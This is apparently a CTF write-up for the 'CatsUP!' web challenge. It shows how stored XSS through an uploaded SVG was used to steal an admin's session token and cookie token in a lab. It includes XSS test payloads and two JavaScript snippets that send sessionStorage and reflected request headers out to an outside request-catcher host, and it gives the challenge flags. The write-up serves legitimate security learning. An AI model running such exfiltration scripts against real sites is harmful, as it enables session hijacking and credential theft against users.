<h3>#1 Challenge: CatsUP! image sharing service</h3><br>
<pre><i>Level: Medium</i>
<i>Points: 200</i></pre>

<img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/CatsUP!%20Image%20sharing%20service/screenshots/chimg.png" style="height: 80px;">
<br>

<h4><i>Challenge description:</i></h4>

<blockquote>
	<h5><i>Introduction</i></h5>
	<p>The admin of the image hosting service CatsUP! is keeping all the best pictures for himself, by removing them from the public web site. From a chat conversation with him we know that he is currently online and logged in to the admin panel.</p>
</blockquote>

<blockquote>
	<h5>Goal</h5>
	<p>The web site is vulnerable to a common web vulnerability which can be used to execute attacker controlled code to steal his session. Find the vulnerability and exploit it to steal his session token, which is stored in his browser's session storage. He also has a persistent login token stored as a cookie, but there is another hurdle to access that one. Can you find the two tokens?</p>
</blockquote>

<blockquote>
	<h5>NOTES</h5>
	<ul>
		<li>The Admin's Browser can only access Hacking-Lab services for security reasons</li>
		<li>Use the provided Request Catcher service as a web server under your control to exfiltrate the data</li>
	</ul>				
</blockquote>

<h4><i>Intro/Thought process</i></h4>

<p>After reading the description and the name of the challenge - "CatsUP" - the first thought that came through my mind is that this challenge will involve some sort of XSS vulnerability. The reason is that, from my previous experience with CTFs, usually titles that includes "cats" are about XSS (I am quite sure that nearly every CTF player or security practitioner knows this duuh!). Of course that doesn't mean that I am straight away right that this will be only about XSS.</p>
<p>Anyway, the plan was to do some reconnaissance and hope that I will find some weird behaviour.</p>

<h4><i>Finding of Initial Vector</i></h4>

<p>Upon entering the site, I see that I can:</p>

<ul>
	<li>Upload an image file with a separate input field to specify a name</li>
	<li>View a random image</li>
	<li>Download an image</li>
	<li>
<ol>Report an image (that I've uploaded or randomly viewed) by selecting one of options three options:
<li>This is not a cat</li>
<li>Bad image quality</li>
<li>Cat is not beautiful enough</li>
 </ol>
</li>
</ul>

<p>As I could see there is a lot of space to test for unexpected behaviour. Before I started playing with the name input field for the image upload, I wanted to check for disallowed paths through <code>robots.txt</code> file if it exists, this is just my usual way to start with on WebSec challenges.</p>
<p>It seems something was there: </p>

<pre>
	User-agent: * 
	Disallow: /help/headers
	Disallow: /i/
</pre>


<p>I tried to access <b><i>/help/headers</i></b> and headers echoed back, which was kinda weird. </p>

<img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/CatsUP!%20Image%20sharing%20service/screenshots/httpheaders.png"/>


<p>I tried accessing <b><i>/i/</i></b> as well, but I only got 404.</p>

<p>At this point I've decided to play with that input field with black box approach.
I provided printable ASCII from Python's <code>string</code> library.

And uploaded my test image file which resulted into this:
</p>

```html
<h1>0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&#34;#$%&amp;\&#39;()*+,-./: is in the cloud...</h1>
<div class="row">
    <img src="/i/3cYVGRFEvLT9VoWx/jpg/1600" alt="Caaaat">
</div>
<p><a href="/i/3cYVGRFEvLT9VoWx/jpg/orig">Download original</a> (use save link target as)</p>
<p>Is this cat against our rules? <a class="btn btn-warning" data-bs-toggle="collapse" href="#report">Report image</a>
</p>
<div class="container collapse" id="report">
    <form method="POST" action="/report">
        <input type="hidden" name="url" value="/img/3cYVGRFEvLT9VoWx">
        <div class="form-check">
            <input class="form-check-input" type="radio" name="reason" value="notacat" id="notacat">
            <label class="form-check-label" for="notacat">
                This is not a cat
            </label>
        </div>
         [...]
        <button type="submit" class="btn btn-primary">Report image</button>
    </form>
</div>
```

<p>Characters that are being escaped are <code>'"<></code>. There was 80 character limit on that input so the last 20 characters got ignored.
So this was sanitized and there was nothing for me to do here in terms of input. 
Next I wanted to see how is this being sent to the server. I've intercepted upload request with Burp and checked the headers: 
</p>

<pre>
POST /upload HTTP/1.1
Host: 183fffb0-94ea-437d-b075-19dcb9ceb107.idocker.vuln.land
Connection: close
Content-Length: 21075
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://183fffb0-94ea-437d-b075-19dcb9ceb107.idocker.vuln.land
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAUN8vBcCotGBB3Yb
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referrer: https://183fffb0-94ea-437d-b075-19dcb9ceb107.idocker.vuln.land/upload
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

------WebKitFormBoundaryAUN8vBcCotGBB3Yb
Content-Disposition: form-data; name="name"

------WebKitFormBoundaryAUN8vBcCotGBB3Yb
Content-Disposition: form-data; name="image"; filename="test.jpeg"
Content-Type: image/jpeg
</pre>

<p>There is this WebKitFormBoundary with Content-Disposition. I was thinking if I could make an html injection and somehow sneak in some JavaScript there. Replacing <code>input</code> with <code>textarea</code> and trying to modify alt tags like name, with this kind of payload:</p>

```html
 <textarea name='file"; filename="test.<img src=xx onerror=alert(1)>'>
```

<p>No luck there, the browser escaped this, but it wasn't unexpected. It was just a wrongly conducted test on my side: </p>

```html
Content-Disposition: form-data; name="file%22; filename=%22test.<img src=xx onerror=alert(1)>"
```
<p>
At this point I was tapping in place for a while. After some time passed I've decided to look up other features of the app. Browsed a random image of a cat and downloaded it (through save image as). I exiftooled the image to see if there is anything interesting there. But there was no interesting metadata in the image itself. I've explored the possibility of injecting JavaScript through exif metadata like Artist/Creator, in case that uploaded image would be served as <code>text/html</code>. Unfortunately that wasn't the case, the image was being served as <code>text/plain</code> so this type of attack was not going to be successful. </p>



<p>But then I realized that it accepts SVG as well, so question that came up is:<br></br>- Why didn't I try uploading SVG that contains JavaScript in the first place???<br></br>I converted my test.jpeg into test.svg, added a simple script with <code>alert("Boom")</code> inside of SVG and uploaded it.<br></br></p>

<p> Next question:<br></br>- Where the hell will this trigger?<br></br>

Well it was quite fishy that below the uploaded image they had a "Download Original" link and next to it: <b>(use save link target as)</b>. 
<br></br>
</p>


```html
<p><a href="/i/3cYVGRFEvLT9VoWx/jpg/orig">Download original</a> (use save link target as)</p>
```

<p>Clicked on download and my alert got triggered!</p>


<img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/CatsUP!%20Image%20sharing%20service/screenshots/xss.png"/>

<br></br>
<h4><i>Stealing session and token</i></h4>

<p>From this part it was clear that this is stored XSS. Next I had to steal the session cookie and the token. Description specified that the token is not in the cookie though. Since I couldn't use my own server for exploit they offered us a "Request Catcher" that would do the job for us. So first I wrote the script to steal the session: </p><br></br>

```javascript
(async function(){
   let data = await fetch("https://62e48ff7-bed8-46ee-91d5-b51fff6486cf.idocker.vuln.land/debug",{
        method:"POST",
        body: JSON.stringify(window.sessionStorage)
   })
})()
```


<p>Now it was time to report my uploaded evil SVG to an admin. Intercepting my request again with Burp and changing path to download path of my image:  </p>



<p>Image is reported, and now I just need to check the captured request. And there was my session which is the first flag: </p>

<img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/CatsUP!%20Image%20sharing%20service/screenshots/Bnd_first_flag.png?raw=true"/>

<b>#1 FLAG: HL{catss_v3ct0r_d3t3cted!}</b>


<p>After I got my session I had to find a token that was not in the cookie. I connected the dots quite fast because of that robot.txt at the start, and all what I had to do was to modify my script a little bit in a way that will cause the reflect XSS. So it is actually quite simple: admin is logged in with a token and session and I know that <b><i>/help/headers</i></b> was reflecting request headers. Therefore I just need to make a GET request to that path in the context of an admin and exfiltrate the data. 
<br></br>Here is my modified script:</p>

```javascript
(async function(){
   let url = "http://localhost/help/headers";
   let resp = await fetch(url);
   let b = await resp.text();
   let data = await fetch("https://62e48ff7-bed8-46ee-91d5-b51fff6486cf.idocker.vuln.land/debug",{
        method:"POST",
        body: b
   })
})()
```

<p>I've checked the captured request and I as expected I've got my token/second flag: </p>

<img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/CatsUP!%20Image%20sharing%20service/screenshots/Bnd_second_flag.png" />

<b>#2 FLAG: <i>HL{r3fl3cted_c4t_p1ck1ng}</i></b>
